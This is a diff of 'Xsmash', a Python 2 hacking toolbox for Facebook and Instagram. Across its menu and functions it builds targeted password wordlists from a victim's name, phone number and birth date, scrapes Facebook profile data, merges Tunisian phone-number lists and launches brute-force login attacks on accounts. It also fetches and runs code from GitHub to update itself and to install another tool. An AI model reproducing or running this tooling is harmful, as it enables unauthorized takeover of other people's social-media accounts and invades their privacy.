@@ -3,9 +3,19 @@
 #######  Ova  #######
 #read trikz.txt (link ..)
 #<raw.github.com/m4rktn/master/xsmash/trikz.txt>
+#[!] If You got Bugs Or You have Ideas Call Me [!]
 #######    Xsmash ~ Priv8 FBHackBox ~   #######
 ####### Hentai Started..Thnx 4 Watching #######
+'''
 
+   ███╗   ███╗██╗  ██╗██████╗ ██╗  ██╗
+   ████╗ ████║██║  ██║██╔══██╗██║ ██╔╝
+   ██╔████╔██║███████║██████╔╝█████╔╝ 
+   ██║╚██╔╝██║╚════██║██╔══██╗██╔═██╗ 
+   ██║ ╚═╝ ██║     ██║██║  ██║██║  ██╗
+   ╚═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝*W4lk3r*
+   (C)opyright > Github.com/M4rktn
+'''
 import string
 import random
 import os,re,sys,json,hashlib,time,os.path
@@ -25,6 +35,8 @@ bigbbs  = '\033[27m'
 hell    = '\033[05m'
 saker   = '\033[25m'
 labyadh = '\033[00m'
+cyan    = '\033[0;96m'
+
 #######  Import sauce  #######
 try: 
  import requests
@@ -37,7 +49,10 @@ except:
       print "Install Python-Pip Sir"
       raw_input('')
   else:
-    os.system('pip2 install requests')
+    try:
+      os.system('pip2 install requests')
+    except:
+      print "%sTry To Install pip2 For Your Devices And Try 'root@usr:~$ pip2 install requests'%s"%(la7mar,labyadh)
 ####### Clear Terminal/cmd #######
 def clear():
   if os.name == 'nt':
@@ -45,18 +60,21 @@ def clear():
   else:
     os.system('clear')
 #For update Reason ..plz Dont change it
-update_jogan="ver0x01" 
-zz=requests.get('https://raw.githubusercontent.com/m4rktn/xsmash/master/xsmash.py')
-if update_jogan not in zz.text.encode('utf-8'):
+update_jogan="ver0x01-11" 
+try:
+ zz=requests.get('https://raw.githubusercontent.com/m4rktn/xsmash/master/xsmash.py')
+ if update_jogan not in zz.text.encode('utf-8'):
   print "{y}Notification {r}! {y}New Version Of {re}X{g}smash \n{y}Do You Want To Get Update RightNow {r}?? ({y}Y{r}/{y}n{r})\033[00m".format(r=la7mar,g=la5dhar,y=la7mar,re=ramadi)
   tfq=raw_input("%ssmash> %s"%(ramadi,lazra9))
-  if tfq.upper() in ['Y','YES','OUI','SI','AY','EY','JA']: #i will Add All Words Mean Yes In Our Planet -_-
+  if tfq.upper() in momoChan:
    if os.name!='nt':
      os.system('wget https://raw.githubusercontent.com/m4rktn/xsmash/master/xsmash.py -O xsmash.py')
    else:
       print "%s#> Install This Tool Wa7dk -_- \nlink> https://github.com/m4rktn/xsmash"%la7mar
-
+except:
+  pass
 #
+momoChan=['Y','YES','O','OUI','SI','AY','EY','JA','HAY'] #All Yes 's Team 
 #######      LogoS        #######
 logooo=""" {g} I Wanna Be Hero n° 1{y} Allmighto {r}!!
                   ~~{g}Medoriya Sama{r}~~
@@ -65,8 +83,8 @@ logooo=""" {g} I Wanna Be Hero n° 1{y} Allmighto {r}!!
  {y} Ultra Smash{r} !{g} 53%
  {y} Ultra Smash{r} !{g} 69%
  {y} Ultra Smash{r} !{g} 97%
- {y} Ultra ...{r} 99.9% ! Failed ...{y} P{p}o{b}ww{r}er !!
-""".format(r=la7mar,y=lasfar,g=la5dhar,p=labyadh,b=lazra9),"""
+ {y} Ultra ...{r} 99.9% ! Failed ...{y} P{p}o{b}ww{r}er !!{bl}
+""".format(r=la7mar,y=lasfar,g=la5dhar,p=labyadh,b=lazra9,bl=blid),"""
  {r} __   __      _____                 _____ _   _ 
  {r} \ \ / /     /  ___|               /  ___| | | |
  {g}  \ V /______\ `--. _ __ ___   __ _\ `--.| |_| |
@@ -125,7 +143,7 @@ def allmight():
       nb=nb+1
     print" %s[✔] %s Number Saved In xrzlts/numpass.txt !"%(la5dhar,nb+1)
   elif noob =='666': 
-   lol() 
+   bokunohero() 
   else:
     exit()
 def medoria():
@@ -181,8 +199,25 @@ def medoria():
   except : 
        pass
  elif ztn=='666':
-  lol()
- 
+  bokunohero()
+def beloumi():
+ try:
+  with open('xrzlts/TNPhones.txt','a') as tounsi:
+    if os.path.isfile('xrzlts/tnoored.txt'):
+     tn1=open('xrzlts/tnoored.txt').read().splitlines()
+    if os.path.isfile('xrzlts/tntt.txt'):
+     tn2=open('xrzlts/tntt.txt').read().splitlines()
+    if os.path.isfile('xrzlts/tnorang.txt'):
+     tn3=open('xrzlts/tnorang.txt').read().splitlines()
+    for i in tn1:
+      tounsi.write(str(i)+'\n')
+    for i in tn2:
+      tounsi.write(str(i)+'\n')
+    for i in tn3:
+      tounsi.write(str(i)+'\n')
+  print "done" 
+ except:
+  medoria()
 def toro():
 ####### Work With Info #######
  hikir=['','2004','2005','2006','2007','2008','2009','2010','2011','2012','2013','2014','2015','2016','2017','2018','2019','qwerty','azerty','azerty123','azerty1234','12','123','1234','12345','123456','1234567','12345678','123456789''1234567890','987654321','321','1111','0000','01','0123','01234','012345','0123456','01234567','012345678','0123456789','11','22','33','44','55','66','77','88','99','00']
@@ -195,6 +230,9 @@ def toro():
     {r}<===========================>  
  """.format(r=la7mar,g=la5dhar,re=ramadi)
  zack =raw_input("%sEnter UserName > %s"%(la7mar,lazra9))
+ while len(zack)==0 or zack[0].isdigit() :
+  print "%s[%s!%s] Invalid Name ..Please Try"%(la7mar,la5dhar,la7mar)
+  zack =raw_input("%sEnter UserName > %s"%(la7mar,lazra9))
  mayar =raw_input("%sEnter Nickname > %s"%(la7mar,lazra9))
  zack2=raw_input("%sEnter PhoneNum > %s"%(la7mar,lazra9))
  while not zack2.isdigit() or len(zack2)<8:
@@ -203,15 +241,27 @@ def toro():
  print "%sHave U The Date ? [Y(Yes)/N(No)]"%la7mar
  gaza=raw_input("%ssmash> %s"%(ramadi,lazra9))
  gaza =gaza.upper()
- if gaza =='Y':
+ if gaza in momoChan:
   daty=raw_input("%s[%s*%s] Enter year [e.g : 1999] : %s"%(la7mar,la5dhar,la7mar,lazra9))
-  while len(daty) ==0 and len(daty) !=4 :
+  while not daty.isdigit():
+    print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
+    daty=raw_input("%s[%s*%s] Enter year [e.g : 1999] : %s"%(la7mar,la5dhar,la7mar,lazra9))
+  while int(daty) not in range(1941,2003) :
+   print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
    daty=raw_input("%s[%s*%s] Enter year [e.g : 1999] : %s"%(la7mar,la5dhar,la7mar,lazra9))
   datm=raw_input("%s[%s*%s] Mounth[mm] : %s"%(la7mar,la5dhar,la7mar,lazra9))
-  while len(datm) ==0 and len(datm) !=2 :
+  while not datm.isdigit():
+    print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
+    datm=raw_input("%s[%s*%s] Mounth[mm] : %s"%(la7mar,la5dhar,la7mar,lazra9))
+  while int(datm) not in range(1,12) :
+   print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
    datm=raw_input("%s[%s*%s] Mounth[mm] : %s"%(la7mar,la5dhar,la7mar,lazra9))
   datd=raw_input("%s[%s*%s] Day[dd] : %s"%(la7mar,la5dhar,la7mar,lazra9))
-  while len(datd) ==0 and len(datd) !=2 :
+  while not datd.isdigit():
+    print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
+    datd=raw_input("%s[%s*%s] Day[dd] : %s"%(la7mar,la5dhar,la7mar,lazra9))
+  while int(datd) not in range(1,31) :
+   print "%s[%s!%s] Incorrect Input ..Please Try"%(la7mar,la5dhar,la7mar)
    datd=raw_input("%s[%s*%s] Day[dd] : %s"%(la7mar,la5dhar,la7mar,lazra9))
  else:
       pass
@@ -255,7 +305,7 @@ def toro():
  else :
   darkside=open('xrzlts/passwd.txt','a')
   darkside.write(zack2+'\n')
- if ille in ['Y','YES','SI','OUI','EY','AY']:
+ if ille in momoChan:
   for xy in range(500):
     side2 = '!@#$%^&*()_+<>.'
     side1 = ''.join(choice(side2) for _ in range(3))
@@ -291,9 +341,9 @@ def toro():
   print "Back To Menu And Put number 5 Or 6 "
   raw_input('<x>Press Enter Or Any Key To Go<x>')
   clear()
-  lol()
+  bokunohero()
  elif nigga =='R':
-  lol()
+  bokunohero()
  else:
   exit()
 ############################
@@ -435,9 +485,9 @@ def lvl69():
   a = json.loads(r.text)
   name = str(a['name'])
   badel=raw_input("%sDo You Want To Continue With %s%s (Y/n)??"%(la5dhar,lazra9,name,la5dhar))
-  if badel.upper() in ['Y','O','AY']:
+  if badel.upper() in momoChan:
     get()
-  elif badel.upper() in ['N','NO','NON','LA']:
+  else:
     lvlgod()
   
 
@@ -625,26 +675,27 @@ def info(target):
   print "%s[%s✔%s] Thnx For Watching Nsibti La3ziza xD%s"%(la7mar,la5dhar,la7mar,lazra9)
   raw_input("press any key to Back To Menu ...")
   clear()
-  lol()
+  bokunohero()
 ####################
-def lol():
+def bokunohero():
 ####### logo ####### 
  print logon
 ####### Menu #######
  print """ 
   {r}<{y}------------------------------------------------------{r}>
-  {r}[{y}!{r}]{y} Im Not Responsible For Any activity From This Tool 
-  {r}[{g}0{r}]{y} Get Info From Facebook(Graph.Fb)
-  {r}[{g}1{r}]{y} Passwords With Info 
-  {r}[{g}2{r}]{y} Passwords With Numbers
-  {r}[{g}3{r}]{y} Passwords With NumberPhone(Only Tunisia) 
-  {r}[{g}4{r}]{y} Get Some Passlists
-  {r}[{g}5{r}]{y} Brute Facebook
-  {r}[{g}6{r}]{y} Brute Facebo²k With PhoneNumbers
-  {r}[{g}7{r}]{y} Brute Instagram 
-  {r}[{g}8{r}]{y} Wanna Secure Password
-  {r}[{g}9{r}]{y} Install Another Tools(With JoganInstaller)
-  {r}[{g}69{r}]{y} Exit 
+  {r}[{y}!{r}]{y}  Im Not Responsible For Any activity From This Tool 
+  {r}[{g}0{r}]{y}  Get Info From Facebook(Graph.Fb)
+  {r}[{g}1{r}]{y}  Passwords With Info 
+  {r}[{g}2{r}]{y}  Passwords With Numbers
+  {r}[{g}3{r}]{y}  Passwords With NumberPhone(Only Tunisia) 
+  {r}[{g}4{r}]{y}  Get Some Passlists
+  {r}[{g}5{r}]{y}  Brute Facebook
+  {r}[{g}6{r}]{y}  Brute Facebo²k With PhoneNumbers
+  {r}[{g}7{r}]{y}  Brute Instagram 
+  {r}[{g}8{r}]{y}  Wanna Secure Password
+  {r}[{g}9{r}]{y}  Install Another Tools(With JoganInstaller)
+  {r}[{g}69{r}]{y} About
+  {r}[{g}ctrl-c{r}]{y} Exit 
   {r}<{y}------------------------------------------------------{r}>""".format(r=la7mar,g=la5dhar,b=lazra9,y=lasfar)
 
  zack=raw_input("  %ssmash> %s"%(ramadi,lazra9))
@@ -672,6 +723,7 @@ def lol():
   else:
     os.system('perl fbsmash.pl')
  elif zack =='6':
+  beloumi()
   os.system('perl zzzz.pl')
  elif zack =='7':
    InstaBrute()
@@ -682,6 +734,20 @@ def lol():
     os.system('git clone https://github.com/m4rktn/jogan && cd jogan && python2 jogan.py')
   else:
     os.system('cd jogan && python2 jogan.py')
+ elif zack =='69':
+   print """
+  {re}~{r}> {g}Ohayo {b}Walkers{r}({g}Hello {b}Walkers{r})
+  {re}~{r}> About {re}: {y}
+     Coder     {re}: {b}M4rkW4lk3r {y}
+     Facebook  {re}: {r}[{b}https://www.facebook.com/officiel.zack{r}] {y}  
+     Instagram {re}: {r}[{b}https://www.instagram.com/pip3.py{r}]  {y}
+     E-mail    {re}: {r}[{b} Dream@protonmail.com {r}] {y}
+     Youtube   {re}: {r}[{b}https://youtube.com/c/M4rkWalker Or Mark Walker{r}]{y}
+     Site      {re}: {r}[{b}http://m4rkwalker.ga{r}]{y}
+     Donating  {re}: {b}I Forget my Btc's Adress Just Contact Me Bro
+  {re}~{r}> {r}<{y}TNT{r}>{g} 1.2.3 Viva La Tunisie {r}</{y}TNT{r}>
+  {re}~{r}> {r}({c}C{r}){c}opyright 2018 - M4rkW4lk3r \033[00m""".format(r=la7mar,b=lazra9,g=la5dhar,y=lasfar,re=ramadi,m=movv,c=cyan)
+ 
  else:
   print "%s Thnx To Eat Mlawy And Chips\n Goood Bye %s"%(la5dhar,labyadh)
   exit()
@@ -694,7 +760,7 @@ if __name__ == '__main__':
       os.mkdir('xrzlts')
     else:
       pass
-    lol()
+    bokunohero()
   except KeyboardInterrupt:
     print "%s Thnx To Eat Mlawy And Chips\n Goood Bye %s"%(la5dhar,labyadh)
 sys.exit()
